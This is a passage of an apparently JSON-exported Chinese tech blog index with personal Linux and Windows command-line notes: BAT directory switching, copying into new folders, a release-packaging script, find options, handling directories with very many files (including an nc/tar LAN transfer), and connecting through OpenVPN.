title=\"windows\"></a>windows</h2><p>最近有時候會接觸到 BAT腳本<br>一樣也是遇到一樣問題<br>不同的是有分 C / D 曹<br>在不同地方處理更是麻煩<br>需要切換<code>C:</code>或<code>D:</code></p>\n<p>如:<br><figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">D:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">cd</span> \"<span class=\"title\">D:xxx</span>\"</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">DIR</span> /<span class=\"title\">S</span> /<span class=\"title\">A</span>:-<span class=\"title\">D</span> /<span class=\"title\">B</span> /<span class=\"title\">O:N</span> &gt;<span class=\"title\">list.txt</span></span></span><br></pre></td></tr></table></figure></p>\n<p>解決方法</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\">@<span class=\"built_in\">echo</span> ===============================================</span><br><span class=\"line\">:: 切換到腳本所在的目錄</span><br><span class=\"line\"><span class=\"built_in\">set</span> WORK_DIR=%~dp0</span><br><span class=\"line\"><span class=\"built_in\">echo</span> Switch to <span class=\"variable\">%WORK_DIR%</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /d <span class=\"variable\">%WORK_DIR%</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">%cd%</span></span><br><span class=\"line\">@<span class=\"built_in\">echo</span> ===============================================</span><br><span class=\"line\">::...加上自己 script</span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://blog.csdn.net/qq981378640/article/details/52980741\" target=\"_blank\" rel=\"noopener\">windows下bat批處理中%和%~dp0的區別_菜鳥攻城獅-CSDN博客</a></p>\n<ul>\n<li><a href=\"http://inpega.blogspot.com/2012/07/cd-dp0.html\" target=\"_blank\" rel=\"noopener\">快閃人生: 【批次檔】%CD% 與 %~dp0</a></li>\n<li><a href=\"https://aimuke.github.io/linux/2019/04/29/how-to-get-abusolute-path/\" target=\"_blank\" rel=\"noopener\">linux獲取當前腳本的絕對路徑 | aimuke</a></li>\n</ul>\n<h2 id=\"彩蛋\"><a href=\"#彩蛋\" class=\"headerlink\" title=\"彩蛋\"></a>彩蛋</h2><p>最近有很多 JAVA 專案是 Maven<br>但在找有什麼快速輸入 mvn install<br>後來看到<a href=\"https://www.opencli.com/linux/linux-run-all-scripts-in-directory\" target=\"_blank\" rel=\"noopener\">Linux 執行目錄下所有 Script</a><br>突然有靈感應該可以做到<br>有空再研究(我沒忘記的話)</p>\n","categories":["Linux"],"tags":["linux","window"]},{"title":"Linux cp 快速複製目的不存在資料夾方法","url":"/blog/2020/09/11/Linux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95/","content":"<p>之前就有在查類似指令<br>但沒有覺得很快速方法<br>這邊先整理</p>\n<a id=\"more\"></a>\n<h2 id=\"mac-cp-–parents\"><a href=\"#mac-cp-–parents\" class=\"headerlink\" title=\"mac cp –parents\"></a>mac cp –parents</h2><p>可用這個指令解決我需求問題<br>但我沒 mac QQ</p>\n<h2 id=\"mkdir-p\"><a href=\"#mkdir-p\" class=\"headerlink\" title=\"mkdir -p\"></a>mkdir -p</h2><p>平常我快速建置資料夾<br>mkdir -p <code>dirname /xxxx/xx/x/x/x/x/filename</code><br>cp xxx /xxxx/xx/x/x/x/x/filename</p>\n<p>但數量越多，這樣做也不會比較快</p>\n<h2 id=\"cp-p-SOURCE…-DIRECTORY\"><a href=\"#cp-p-SOURCE…-DIRECTORY\" class=\"headerlink\" title=\"cp-p SOURCE… DIRECTORY/\"></a>cp-p SOURCE… DIRECTORY/</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp-<span class=\"function\"><span class=\"title\">p</span></span>() &#123;</span><br><span class=\"line\">  last=<span class=\"variable\">$&#123;@: -1&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [[ <span class=\"variable\">$#</span> -ge 2 &amp;&amp; <span class=\"string\">\"<span class=\"variable\">$last</span>\"</span> == */ ]] ; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"comment\"># cp SOURCE... DEST/</span></span><br><span class=\"line\">    mkdir -p <span class=\"string\">\"<span class=\"variable\">$last</span>\"</span> &amp;&amp; cp <span class=\"string\">\"<span class=\"variable\">$@</span>\"</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"cp-p: (copy, creating parent dirs)\"</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"cp-p: Usage: cp-p SOURCE... DEST/\"</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但這樣改從清單還要多一層處理目的資料夾<br>我覺得不是很實用</p>\n<h2 id=\"install-D\"><a href=\"#install-D\" class=\"headerlink\" title=\"install -D\"></a>install -D</h2><p>install -D test1.sh ./xxx/test.sh      </p>\n<p><del>但不確定什麼問題，沒選出最佳答案</del></p>\n<h3 id=\"install-指定清單做複製方法\"><a href=\"#install-指定清單做複製方法\" class=\"headerlink\" title=\"install 指定清單做複製方法\"></a>install 指定清單做複製方法</h3><p>最近因為專案是用 SVN<br>但包檔要給客戶需要包成zip<br>這邊有時候從 SVN 去看目錄手動複製真的很麻煩<br>尤其還要對 class去做複製</p>\n<p>今天寫了好用腳本<br>Windows 10 直接用 WSL 也可以操作<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># 包版日期</span></span><br><span class=\"line\">DAYV=<span class=\"string\">\"201113\"</span></span><br><span class=\"line\"><span class=\"comment\"># 包版版本</span></span><br><span class=\"line\">VERSION=<span class=\"string\">\"002\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 有針對資料夾和檔案都可以做複製</span></span><br><span class=\"line\"><span class=\"comment\"># 萬用字玩也可以</span></span><br><span class=\"line\"><span class=\"comment\"># 找不檔案也不會有問題</span></span><br><span class=\"line\">SPATHLIST=(</span><br><span class=\"line\"><span class=\"comment\"># #SHARE</span></span><br><span class=\"line\">./web/build/classes/aa</span><br><span class=\"line\">./web/build/classes/aa/</span><br><span class=\"line\"><span class=\"comment\"># BATCH</span></span><br><span class=\"line\">./TEST</span><br><span class=\"line\">./batch/src/com/abc/batch/Aaaaa.java</span><br><span class=\"line\">./batch/src/com/abc/batch/schedule/job/*</span><br><span class=\"line\"><span class=\"comment\"># bin, class</span></span><br><span class=\"line\">./batch/bin/com/abc/batch/Aaaaa.class</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># install 資料夾複製方法參考</span></span><br><span class=\"line\"><span class=\"comment\"># https://unix.stackexchange.com/questions/165463/problem-with-install-command-to-copy-a-whole-directory</span></span><br><span class=\"line\"></span><br><span class=\"line\">DPATH=<span class=\"string\">\"/CodePackage/<span class=\"variable\">$&#123;DAYV&#125;</span>/<span class=\"variable\">$&#123;VERSION&#125;</span>/<span class=\"variable\">$&#123;DAYV&#125;</span>_code_package\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">length=<span class=\"variable\">$&#123;#SPATHLIST[@]&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(( j=0; j&lt;<span class=\"variable\">$length</span>; j++ ))</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> [[ ! -e <span class=\"string\">\"<span class=\"variable\">$&#123;SPATHLIST[$j]&#125;</span>\"</span> ]]; <span class=\"keyword\">then</span> <span class=\"comment\"># 檢查檔案 https://linuxize.com/post/bash-check-if-file-exists/</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$&#123;SPATHLIST[$j]&#125;</span>找不到檔案檔案\"</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">continue</span></span><br><span class=\"line\">\t<span class=\"keyword\">fi</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> [[ -d <span class=\"string\">\"<span class=\"variable\">$&#123;SPATHLIST[$j]&#125;</span>\"</span> ]]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"comment\"># 加入 exec 印出內容</span></span><br><span class=\"line\">\t\t<span class=\"comment\"># https://askubuntu.com/questions/651315/how-do-you-output-the-filename-in-find-command-while-using-exec</span></span><br><span class=\"line\">\t\tfind <span class=\"string\">\"<span class=\"variable\">$&#123;SPATHLIST[$j]&#125;</span>\"</span> -<span class=\"built_in\">type</span> f -<span class=\"built_in\">printf</span> <span class=\"string\">'%p\\n'</span> -<span class=\"built_in\">exec</span> install -D  <span class=\"string\">\"&#123;&#125;\"</span> <span class=\"string\">\"<span class=\"variable\">$&#123;DPATH&#125;</span>/&#123;&#125;\"</span> \\;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\tinstall -D <span class=\"variable\">$&#123;SPATHLIST[$j]&#125;</span> <span class=\"variable\">$&#123;DPATH&#125;</span>/<span class=\"variable\">$&#123;SPATHLIST[$j]&#125;</span>\t</span><br><span class=\"line\">\t<span class=\"keyword\">fi</span></span><br><span class=\"line\">\t<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$&#123;SPATHLIST[$j]&#125;</span> 成功搬移 <span class=\"variable\">$&#123;DPATH&#125;</span>/<span class=\"variable\">$&#123;SPATHLIST[$j]&#125;</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\">cp ./copyfiles.sh <span class=\"variable\">$&#123;DPATH&#125;</span>/../copyfiles<span class=\"variable\">$&#123;DAYV&#125;</span><span class=\"variable\">$&#123;VERSION&#125;</span>.sh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 寫更版紀錄 txt</span></span><br><span class=\"line\">TXT_FILE=<span class=\"string\">\"更版紀錄_<span class=\"variable\">$&#123;DAYV&#125;</span>_<span class=\"variable\">$&#123;VERSION&#125;</span>.txt\"</span></span><br><span class=\"line\">TXT_FILEPATH=<span class=\"variable\">$&#123;DPATH&#125;</span>/<span class=\"variable\">$&#123;TXT_FILE&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"&lt;<span class=\"variable\">$&#123;DAYV&#125;</span>_<span class=\"variable\">$&#123;VERSION&#125;</span>&gt; #\"</span> &gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"\"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"Revision: &gt;&gt;&gt;&gt;&gt;&gt; (Beta<span class=\"variable\">$&#123;VERSION&#125;</span>)\"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"Author: xxx\"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"Date: <span class=\"variable\">$(date +\"%Y年%m月%d日 %T\")</span>\"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"\"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\" #&gt;&gt;&gt;&gt;&gt;&gt;\"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"\"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"【問題說明】\"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"     &gt;&gt;&gt;&gt;&gt;&gt;\"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"【處理說明】\"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"     &gt;&gt;&gt;&gt;&gt;&gt;\"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"     \"</span> &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"\"</span>  &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"相關程式如下：\"</span>  &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"\"</span>  &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(( j=0; j&lt;<span class=\"variable\">$length</span>; j++ ))</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">\t<span class=\"built_in\">let</span> INDEX=<span class=\"variable\">$j</span>+1</span><br><span class=\"line\">\t<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$&#123;INDEX&#125;</span>.\"</span> <span class=\"string\">\"<span class=\"variable\">$&#123;SPATHLIST[$j]&#125;</span>\"</span>  &gt;&gt; <span class=\"variable\">$&#123;TXT_FILEPATH&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 產生 password txt(為了手動包 zip用的)</span></span><br><span class=\"line\"><span class=\"comment\"># 因為客戶需要更版紀錄，我需要去 Mantis 複製內容再zip</span></span><br><span class=\"line\"> <span class=\"built_in\">echo</span> <span class=\"string\">\"pwd20\"</span><span class=\"variable\">$&#123;DAYV&#125;</span> &gt;  <span class=\"variable\">$&#123;DPATH&#125;</span>/../password.txt</span><br></pre></td></tr></table></figure></p>\n<p>這樣半自動化，相信能減少很多出錯</p>\n","categories":["Linux"],"tags":["linux","cp"]},{"title":"Linux find 實用指令筆記","url":"/blog/2018/08/18/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/","content":"<p>最近看同事用<code>find</code>搜尋異動檔案指令<br>真的很方便<br>不用<code>ls -l</code>看了老半天<br>這真的太好用了<br>筆記筆記</p>\n<a id=\"more\"></a>\n<p>以下筆記是參考<br><a href=\"/blog/2018/08/18/Linux-find-實用指令筆記/gtwang.org_web.png\" title=\"Unix/Linux 的 find 指令使用教學、技巧與範例整理 - G. T. Wang 備份圖\">Unix/Linux 的 find 指令使用教學、技巧與範例整理 - G. T. Wang 備份圖</a><br><a href=\"https://blog.gtwang.org/linux/unix-linux-find-command-examples/\" target=\"_blank\" rel=\"noopener\">Unix/Linux 的 find 指令使用教學、技巧與範例整理 - G. T. Wang</a></p>\n<h2 id=\"mmin-實用\"><a href=\"#mmin-實用\" class=\"headerlink\" title=\"-mmin(實用)\"></a>-mmin(實用)</h2><p>find . -mmin -5</p>\n<p>查詢現在異動時間5分鐘的檔案<br>這招很實用<br>尤其跑程式，查詢有異動那些檔案<br>真的很方便ˇ</p>\n<h2 id=\"type\"><a href=\"#type\" class=\"headerlink\" title=\"-type\"></a>-type</h2><p><code>- type {xx}</code>找檔案類型</p>\n<p>找檔案<code>-f</code></p>\n<p>找資料夾 <code>-d</code></p>\n<h2 id=\"size\"><a href=\"#size\" class=\"headerlink\" title=\"-size\"></a>-size</h2><p><code>-size 100M</code>剛好100MB</p>\n<p><code>-size +50M</code>大於50MB</p>\n<p><code>-size -50M</code>小於50MB</p>\n<h2 id=\"perm-xxx\"><a href=\"#perm-xxx\" class=\"headerlink\" title=\"-perm xxx\"></a>-perm xxx</h2><p>搜尋權限</p>\n<p><code>-perm 777</code></p>\n<h2 id=\"empty\"><a href=\"#empty\" class=\"headerlink\" title=\"-empty\"></a>-empty</h2><p>如果要找尋空檔案，可以使用 -empty 參數：<br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">find . -<span class=\"built_in\">type</span> f -empty</span><br></pre></td></tr></table></figure></p>\n<p>找尋空目錄：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">find . -<span class=\"built_in\">type</span> d -empty</span><br></pre></td></tr></table></figure>\n<p>參考來源:<br><a href=\"https://blog.gtwang.org/linux/unix-linux-find-command-examples/\" target=\"_blank\" rel=\"noopener\">Unix/Linux 的 find 指令使用教學、技巧與範例整理 - G. T. Wang</a></p>\n","categories":["Linux"],"tags":["linux","find"]},{"title":"Linux ls 大量檔案卡住解決方法","url":"/blog/2019/09/27/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/","content":"<p>今天在大量檔案資料夾(約19萬個檔案)<br>下 command line 下 ls 之後就卡住<br>不能用 <code>Ctrl + C</code> 跳出去…</p>\n<a id=\"more\"></a>\n<p>在想有什麼方法解決這個問題?</p>\n<h2 id=\"ls-1-f\"><a href=\"#ls-1-f\" class=\"headerlink\" title=\"ls -1 -f\"></a>ls -1 -f</h2><p><strong>注意這邊 -1 是數字1，不是英文小寫L</strong><br>查看了一下 <code>-f</code> 就是不做排序，<code>-1</code>是做一欄輸出</p>\n<p><a href=\"http://www.zxzblog.com/linux-morefile/\" target=\"_blank\" rel=\"noopener\">Linux下文件过多过碎问题 – 工作笔记</a></p>\n<h2 id=\"刪除多個檔案\"><a href=\"#刪除多個檔案\" class=\"headerlink\" title=\"刪除多個檔案\"></a>刪除多個檔案</h2><p>雖然我沒有現在要做，不過都看到方法，順便記錄一下。</p>\n<h3 id=\"strace\"><a href=\"#strace\" class=\"headerlink\" title=\"strace\"></a>strace</h3><p>這篇用<a href=\"https://beyondkmp.github.io/%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/ls%E5%91%BD%E4%BB%A4%E5%8D%A1%E4%BD%8F.html\" target=\"_blank\" rel=\"noopener\">非常大的文件夹导致ls命令卡住</a> strace 方法</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ls -l &gt;/dev/null</span><br><span class=\"line\">strace -p 3963 2&gt;&amp;1 | grep lstat</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># lstat64(“xxxxx”, &#123;st_mode=S_IFREG|0664, st_size=0, …&#125;) = 0</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.oschina.net/question/255612_220479\" target=\"_blank\" rel=\"noopener\">Linux 删除海量文件 rm -f 会卡死怎么破？ - OSCHINA</a></p>\n<h3 id=\"rsync-–delete-before\"><a href=\"#rsync-–delete-before\" class=\"headerlink\" title=\"rsync –delete-before\"></a>rsync –delete-before</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rsync –delete-before -d -a –progress –stats /a/ /data/</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://www.zxzblog.com/linux-morefile/\" target=\"_blank\" rel=\"noopener\">Linux下文件过多过碎问题 – 工作笔记</a><br><a href=\"https://www.oschina.net/question/255612_221510\" target=\"_blank\" rel=\"noopener\">还是Linux删除海量文件的问题，那些说用rsync –delete-before完全没用 - OSCHINA</a></p>\n<h3 id=\"別人多個測試結果\"><a href=\"#別人多個測試結果\" class=\"headerlink\" title=\"別人多個測試結果\"></a>別人多個測試結果</h3><blockquote>\n<p><a href=\"http://www.slashroot.in/which-is-the-fastest-method-to-delete-files-in-linux\" target=\"_blank\" rel=\"noopener\">http://www.slashroot.in/which-is-the-fastest-method-to-delete-files-in-linux</a><br>刪除50萬個文件,各種方法的速度對比:</p>\n<p>先創建50萬個文件:<br>for i in $(seq 1 500000); do echo testing &gt;&gt; $i.txt; done</p>\n<p>各種刪除當前目錄文件方法,先進入該目錄(比如PHP的sessions目錄),然後執行以下命令:<br>time rm -f <em> 刪除失敗,返回 /bin/rm: Argument list too long<br>time find ./ -type f -exec rm {} \\;<br>time find ./ -type f -delete<br>time rsync -a –delete EmptyDir/ BigDir/<br>time perl -e ‘for(&lt;</em>&gt;){((stat)9&lt;(unlink))}’</p>\n<p>結果:<br>perl用了1分鐘<br>rsync用了3分鐘<br>find with -delete用了5分鐘<br>find with -exec用了14分鐘<br>直接用rm結果是刪除失敗. </p>\n</blockquote>\n<p><a href=\"https://www.oschina.net/question/255612_220479\" target=\"_blank\" rel=\"noopener\">Linux 刪除海量文件 rm -f 會卡死怎麼破？ - OSCHINA</a></p>\n<h2 id=\"大量檔案複製\"><a href=\"#大量檔案複製\" class=\"headerlink\" title=\"大量檔案複製\"></a>大量檔案複製</h2><blockquote>\n<p>3、小文件太多，複製太慢<br>　　1，在需要對大量小文件進行移動或複製時，用cp、mv都會顯得很沒有效率，可以用tar先壓縮再解壓縮的方式。<br>　　2，在網絡環境中傳輸時，可以再結合nc命令，通過管道和tcp端口進行傳輸。<br>　　nc和tar可以用來快速的在兩台機器之間傳輸文件和目錄，比ftp和scp要來得簡單的多。<br>　　由於nc是一個超輕量的命令，所以一般busybox都會集成它。當一個linux終端，比如linux pda,<br>　　通過usblan的方式連接到另一台linux主機的時候，這樣的嵌入式終端上一般不會集成ftp server, ssh server<br>　　這樣比較笨重的服務，這個時候， nc可能成為唯一的上傳手段。<br>　　比如將機器A上的test目錄上傳到到機器 B（192.168.0.11）上，只需要：<br>　　在機器B上，用nc來監聽一個端口，隨便就好，只要不被佔用；並且將收到的數據用tar展開。-l代表監聽模式。<br>　　#nc -l 4444 |tar -C /tmp/dir -zxf –<br>　　然後，在A上通過nc和 tar發送test目錄。使用一致的4444的端口。<br>　　#tar -zcvf – test|nc 192.168.0.11 4444</p>\n</blockquote>\n<p><a href=\"http://www.zxzblog.com/linux-morefile/\" target=\"_blank\" rel=\"noopener\">Linux下文件過多過碎問題 – 工作筆記</a></p>\n<p>哪天用到再說…</p>\n","categories":["Linux"],"tags":["linux","ls"]},{"title":"Linux 使用 openvpn 連線小記","url":"/blog/2020/06/25/Linux-%E4%BD%BF%E7%94%A8-openvpn-%E9%80%A3%E7%B7%9A%E5%B0%8F%E8%A8%98/","content":"<p>最近要做測試國外網域的問題<br><a href=\"https://www.vpngate.net/cn/\" target=\"_blank\" rel=\"noopener\">VPN Gate: 公共 VPN 中继服务器列表</a><br>發現 VPN Gate 網站滿多 vpn 資訊<br>想使用 Linux 做操作<br>找了網路上資源<br>真的不是很多</p>\n<a id=\"more\"></a>\n<p>這邊簡單做一下筆記</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 前面可以用 VM 開啟，我這邊是用 vagrant</span></span><br><span class=\"line\"><span class=\"comment\"># 安裝 openvpn</span></span><br><span class=\"line\">sudo apt install openvpn tmux</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 下載 openv，可從 vpn gate 那邊下載</span></span><br><span class=\"line\">wget https://..../...ovpn 這邊下載檔名不能跟下載不一樣，建議還是用瀏覽器下載</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 開啟 tmux ，因為連接需要多開，</span></span><br><span class=\"line\">tmux </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 執行 openvpn</span></span><br><span class=\"line\">openvpn ./xxxx.ovpn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 切回 command line</span></span><br><span class=\"line\">Ctrl+b  and d</span><br><span class=\"line\"></span><br><span class=\"line\">ifconfig</span><br><span class=\"line\"><span class=\"comment\"># enp0s3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span></span><br><span class=\"line\"><span class=\"comment\">#         inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255</span></span><br><span class=\"line\"><span class=\"comment\">#         inet6 fe80::e8:2fff:fe1c:32d4  prefixlen 64  scopeid 0x20&lt;link&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#         ether 02:e8:2f:1c:32:d4  txqueuelen 1000  (Ethernet)</span></span><br><span class=\"line\"><span class=\"comment\">#         RX packets 75995  bytes 94960003 (94.9 MB)</span></span><br><span class=\"line\"><span class=\"comment\">#         RX errors 0  dropped 0  overruns 0  frame 0</span></span><br><span class=\"line\"><span class=\"comment\">#         TX packets 13566  bytes 1040385 (1.0 MB)</span></span><br><span class=\"line\"><span class=\"comment\">#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span></span><br><span class=\"line\"><span class=\"comment\">#         inet 127.0.0.1  netmask 255.0.0.0</span></span><br><span class=\"line\"><span class=\"comment\">#         inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#         loop  txqueuelen 1000  (Local Loopback)</span></span><br><span class=\"line\"><span class=\"comment\">#         RX packets 36  bytes 3512 (3.5 KB)</span></span><br><span class=\"line\"><span class=\"comment\">#         RX errors 0  dropped 0  overruns 0  frame 0</span></span><br><span class=\"line\"><span class=\"comment\">#         TX packets 36  bytes 3512 (3.5 KB)</span></span><br><span class=\"line\"><span class=\"comment\">#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500</span></span><br><span class=\"line\"><span class=\"comment\">#         inet 10.242.23.205  netmask 255.255.255.255  destination 10.242.23.206</span></span><br><span class=\"line\"><span class=\"comment\">#         inet6 fe80::aad3:fe27:fda5:76d3  prefixlen 64  scopeid 0x20&lt;link&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#         unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)</span></span><br><span class=\"line\"><span class=\"comment\">#         RX packets 2  bytes 1352 (1.3 KB)</span></span><br><span class=\"line\"><span class=\"comment\">#         RX errors 0  dropped 0  overruns 0  frame 0</span></span><br><span class=\"line\"><span class=\"comment\">#         TX packets 3  bytes 128 (128.0 B)</span></span><br><span class=\"line\"><span class=\"comment\">#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></span><br></pre></td></tr></table></figure>\n<p>會多一個 interface( tun0 ) 這個部分就是有連接到 vpn </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl ifconfig.me</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 看國家(看流量)</span></span><br><span class=\"line\">curl ipinfo.io</span><br></pre></td></tr></table></figure>\n<p>完成</p>\n","categories":["Linux"],"tags":["linux"]},{"title":"Linux 執行多個目錄全部指令方法","url":"/blog/2020/09/11/Linux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95/","content":"<p>最近抓取一些專案<br>需要執行 mvn install<br>但是非常多專案<br>在想有什麼快速方法(雖然已經手動執行完了)</p>\n<a id=\"more\"></a>\n<p>最近看到<a href=\"https://www.opencli.com/linux/linux-run-all-scripts-in-directory\" target=\"_blank\" rel=\"noopener\">Linux 執行目錄下所有 Script</a>可以解決我的需求<br>就嘗試看看</p>\n<h2 id=\"run-parts\"><a href=\"#run-parts\" class=\"headerlink\" title=\"run-parts\"></a>run-parts</h2><p>run-parts 就是執行當下所有目錄的程式，這之前在 crontab 有看到<br>但沒有仔細去研究</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">run-parts –regex <span class=\"string\">'.*sh$'</span> /home/pi/shell/</span><br></pre></td></tr></table></figure>\n<h3 id=\"預設抓取檔案\"><a href=\"#預設抓取檔案\" class=\"headerlink\" title=\"預設抓取檔案\"></a>預設抓取檔案</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">run-parts  --list  /home/malagege/run-parts</span><br><span class=\"line\">/home/malagege/run-parts/test</span><br></pre></td></tr></table></figure>\n<p>所以記得要寫 regex</p>\n<h3 id=\"相關文章\"><a href=\"#相關文章\" class=\"headerlink\" title=\"相關文章\"></a>相關文章</h3><ul>\n<li><a href=\"https://www.cnblogs.com/yychuyu/p/12983328.html\" target=\"_blank\" rel=\"noopener\">如何將目錄下的腳本一次性全部執行 - 良許Linux - 博客園</a></li>\n<li><a href=\"https://blog.csdn.net/WYpersist/article/details/80246860\" target=\"_blank\" rel=\"noopener\">Linux之 run-parts 